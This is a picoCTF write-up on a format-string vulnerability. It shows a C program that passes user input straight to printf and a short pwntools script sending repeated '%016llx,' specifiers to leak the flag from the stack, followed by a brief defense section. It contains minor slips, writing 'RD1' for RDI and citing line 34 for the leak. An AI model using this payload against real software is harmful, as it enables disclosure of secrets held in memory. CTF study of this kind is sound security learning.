# format string 1 

**CTF**: picoCTF 2024
**Category:** Binary Exploitation
**Difficulty**: Medium
**Tags**: `format_string`

#### Challenge Description
In this challenge, you are to exploit a program that prompts you to enter a string and then spits out that string back to you.

#### Environment Setup
Tools: `file`, `gdb`, `checksec`, `pwntools`
OS: Ubuntu 22.04.5 LTS x86_64

#### Initial Analysis
Using `file` we can conduct some initial analysis of the executable

`file` output:
```
format-string-1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=62bc37ea6fa41f79dc756cc63ece93d8c5499e89, for GNU/Linux 3.2.0, not stripped
```
└ Most valuable piece of information is that this a 64-bit executable, which will help in constructing the payload later on.

#### Vulnerability
An FSV is discovered through inspection of the program's source code.

Here is the entire program source for reference:
```c
  1 #include <stdio.h>
  2 
  3 
  4 int main() {
  5   char buf[1024];
  6   char secret1[64];
  7   char flag[64];
  8   char secret2[64];
  9 
 10   // Read in first secret menu item
 11   FILE *fd = fopen("secret-menu-item-1.txt", "r");
 12   if (fd == NULL){
 13     printf("'secret-menu-item-1.txt' file not found, aborting.\n");
 14     return 1;
 15   }
 16   fgets(secret1, 64, fd);
 17   // Read in the flag
 18   fd = fopen("flag.txt", "r");
 19   if (fd == NULL){
 20     printf("'flag.txt' file not found, aborting.\n");
 21     return 1;
 22   }
 23   fgets(flag, 64, fd);
 24   // Read in second secret menu item
 25   fd = fopen("secret-menu-item-2.txt", "r");
 26   if (fd == NULL){
 27     printf("'secret-menu-item-2.txt' file not found, aborting.\n");
 28     return 1;
 29   }
 30   fgets(secret2, 64, fd);
 31 
 32   printf("Give me your order and I'll read it back to you:\n");
 33   fflush(stdout);
 34   scanf("%1024s", buf);
 35   printf("Here's your order: ");
 36   printf(buf);
 37   printf("\n");
 38   fflush(stdout);
 39 
 40   printf("Bye!\n");
 41   fflush(stdout);
 42 
 43   return 0;
 44 }
```
On line 36 we can see that the `printf` function is called with a string `buf` as the format string argument. 

On line 34, we also see that a call to `scanf` reads a string into `buf`. 

So this means that the user controls the format argument of the `printf` function, which will effectively allow us to read a bunch of data off of the program's stack.

To understand how this is possible, we must first understand an important detail about how C's calling convention works. In 64-bit, C stores integer/pointer arguments passed to functions in the following order of registers:
1) RD1
2) RSI
3) RDX
4) RCX
5) R8
6) R9

and then subsequent arguments are stored on the stack.

Another important detail pertains to how `printf` works. In order for `printf` to function as intended, each format specifier in its format string must correspond to a variable argument passed after the format string. 

In the case that the format specifier does not have a corresponding variable argument, then `printf` will still attempt to read  from the location where the data for the variable argument *would* be contained, which is either in registers or on the stack. Combining this with the fact that the user controls the contents of the `buf` string, we can read off large amounts of data off of the stack. 
#### Exploit Strategy
It is now understood that we can utilize line 34 of the program to read data off of the stack. This is useful due to the fact that the variable `flag` is also sitting on the stack, which means all we need to do is leak enough memory to read the flag. 

The exact approach is to include a series of format specifiers, each separated by a delimiter. In this case, since we know it is a 64-bit executable, we can use `%llx` which reads a 64-bit hex value.

Example: `%llx,%llx,%llx,%llx,%llx` and you keep adding more format specifiers until you have leaked the entire flag.

#### Exploit Code
This exploit will leak a sufficient amount of stack memory that can then be decoded to retrieve the flag by plugging it into a tool like cyberchef.

```python
import pwn

r = pwn.remote("XXXX", XXXXX) # enter the specific credentials for your instance.
s = r.recvuntil('you:')

r.sendline(b"%016llx," * 50);
r.interactive()
```
#### Takeaways
This challenge showcases how the program's memory can be exposed if user input is interpreted as a format string.
#### Defense Discussion
Thankfully, guarding against these sorts of vulnerabilities can be quite simple. 

The golden rule is to **never use user input as a format string**. Another thing is to pay attention to compiler warnings, as it will warn you when this vulnerability is present in your code.
